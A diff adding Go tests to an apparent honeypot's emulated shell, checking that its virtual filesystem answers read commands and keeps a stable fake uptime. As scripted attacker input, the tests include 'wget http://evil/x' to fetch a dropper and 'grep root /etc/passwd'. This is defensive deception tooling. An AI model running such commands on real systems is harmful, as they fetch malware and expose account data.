@@ -4,6 +4,7 @@ import (
 	"context"
 	"strings"
 	"testing"
+	"time"
 )
 
 func TestVFSNavAndFiles(t *testing.T) {
@@ -103,6 +104,55 @@ func TestRunWithFSPersistsAcrossSessions(t *testing.T) {
 	RunWithFS(context.Background(), in2, &out2, nil, fs)
 	if !strings.Contains(out2.String(), "mirai") {
 		t.Errorf("session 2 ls/cat did not show the persisted dropper:\n%s", out2.String())
+	}
+}
+
+func TestVFSReadCommands(t *testing.T) {
+	fs := NewFS("/root")
+	fs.Apply("cd", []string{"cd", "/tmp"}, "cd /tmp")
+	// Build a multi-line file via echo >> (append).
+	fs.Apply("echo", []string{"echo", "alpha", ">", "n.txt"}, "echo alpha > n.txt")
+	fs.Apply("echo", []string{"echo", "BETA", ">>", "n.txt"}, "echo BETA >> n.txt")
+	fs.Apply("echo", []string{"echo", "gamma", ">>", "n.txt"}, "echo gamma >> n.txt")
+
+	if out, ok := fs.Apply("wc", []string{"wc", "-l", "n.txt"}, "wc -l n.txt"); !ok || !strings.HasPrefix(out, "3 ") {
+		t.Errorf("wc -l = %q ok=%v want 3 lines", out, ok)
+	}
+	if out, ok := fs.Apply("head", []string{"head", "-n", "1", "n.txt"}, "head -n 1 n.txt"); !ok || !strings.Contains(out, "alpha") || strings.Contains(out, "gamma") {
+		t.Errorf("head -n1 = %q", out)
+	}
+	if out, ok := fs.Apply("tail", []string{"tail", "-n", "1", "n.txt"}, "tail -n 1 n.txt"); !ok || !strings.Contains(out, "gamma") {
+		t.Errorf("tail -n1 = %q", out)
+	}
+	// grep -i matches case-insensitively.
+	if out, ok := fs.Apply("grep", []string{"grep", "-i", "beta", "n.txt"}, "grep -i beta n.txt"); !ok || !strings.Contains(out, "BETA") {
+		t.Errorf("grep -i = %q", out)
+	}
+	// find -name over the attacker's tree.
+	if out, ok := fs.Apply("find", []string{"find", "/tmp", "-name", "*.txt"}, "find /tmp -name *.txt"); !ok || !strings.Contains(out, "/tmp/n.txt") {
+		t.Errorf("find = %q", out)
+	}
+	// A downloaded payload is reported as an ELF by `file`.
+	fs.Apply("wget", []string{"wget", "http://evil/x"}, "wget http://evil/x")
+	if out, ok := fs.Apply("file", []string{"file", "x"}, "file x"); !ok || !strings.Contains(out, "ELF") {
+		t.Errorf("file dropper = %q", out)
+	}
+	// A read command over a NON-overlay (base-image) path falls through.
+	if _, ok := fs.Apply("grep", []string{"grep", "root", "/etc/passwd"}, "grep root /etc/passwd"); ok {
+		t.Error("grep over a base-image path should fall through to the canned table")
+	}
+}
+
+func TestHostUptimeAdvances(t *testing.T) {
+	// Boot is a stable epoch, so uptime must be large and consistent — not a
+	// fixed "up N days" that never changes. Two derivations agree (stable).
+	h1 := deriveHost(nil)
+	if !h1.boot.Before(time.Now().Add(-24 * time.Hour)) {
+		t.Errorf("boot should be well in the past (stable epoch), got %v", h1.boot)
+	}
+	h2 := deriveHost(nil)
+	if !h1.boot.Equal(h2.boot) {
+		t.Errorf("boot must be stable across derivations: %v vs %v", h1.boot, h2.boot)
 	}
 }
 
